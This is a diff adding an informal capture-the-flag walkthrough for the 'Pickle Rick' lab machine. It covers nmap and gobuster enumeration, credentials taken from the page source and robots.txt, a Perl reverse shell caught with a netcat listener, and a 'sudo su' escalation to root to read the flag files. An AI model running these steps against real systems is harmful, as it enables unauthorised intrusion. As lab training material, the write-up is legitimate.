@@ -1,0 +1,123 @@
+#### To Solve Pickle Rick
+
+1) nmap scanning 
+        
+          [nmap -sC -sV IP]
+
+
+2) enumerotion using gobuster
+
+ 
+      [gobuster dir -u http://10.10.186.73/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt]
+
+
+Then we will find assets and login.php
+SOOOOO... we gonna try diffrent methods  on browser
+ ** On first time we try to see the source code we will fing usearname 'R1ckRul3s'
+                      = IP/robots.txt
+                BooM! we got  like passrd 'Wubbalubbadubdub'
+                      = IP/login.php
+
+                      then we will try to log in..
+        wow , we foung excution box 
+
+      *****  soo here we gonna use revrseshell 'perl'***
+ do not forget to connect your machine ip and port and start lesting the
+
+ AFTER this all now we have got  command shell
+
+              try the bloew all commands
+--------------------------------------------------------------
+hopelad@parrot]─[~/Desktop/tryhackme/PP]
+└──╼ $nc -lvp 4242
+listening on [any] 4242 ...
+10.10.186.73: inverse host lookup failed: Unknown host
+connect to [10.9.152.133] from (UNKNOWN) [10.10.186.73] 55634
+sh: 0: can't access tty; job control turned off
+
+    $ [id]
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+     $ [l]s
+
+Sup3rS3cretPickl3Ingred.txt
+assets
+clue.txt
+denied.php
+index.html
+login.php
+portal.php
+robots.txt
+
+$ cat clue.txt
+
+Look around the file system for the other ingredi
+
+      $ [pwd]
+
+/var/www/html
+
+      $ [ls]
+
+Sup3rS3cretPickl3Ingred.txt
+assets
+clue.txt
+denied.php
+index.html
+login.php
+portal.php
+robots.txt
+
+     $ [cat Sup3rS3cretPickl3Ingred.txt
+          mr. meeseek hair
+
+    $ [cd /home]
+
+    $ [ls]
+
+     rick
+     ubuntu
+
+    $ [cd rick]
+
+    $ [ls]
+
+
+     second ingredients
+
+    $ [cat "second ingredients"      
+      1 jerry tear
+    $ [sudo -l
+Matching Defaults entries for www-data on
+    ip-10-10-186-73.eu-west-1.compute.internal:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on
+        ip-10-10-186-73.eu-west-1.compute.internal:
+    (ALL) NOPASSWD: ALL
+    $ [sudo su]
+
+      [whoami]
+
+      root
+      [ls]
+
+      second ingredients
+
+      [id]
+
+      uid=0(root) gid=0(root) groups=0(root)
+
+      [cd /root]
+
+      [ls]
+
+      3rd.txt
+      snap
+
+       [cat 3rd.txt]
+3rd ingredients: fleeb juice
+
+      DONE!
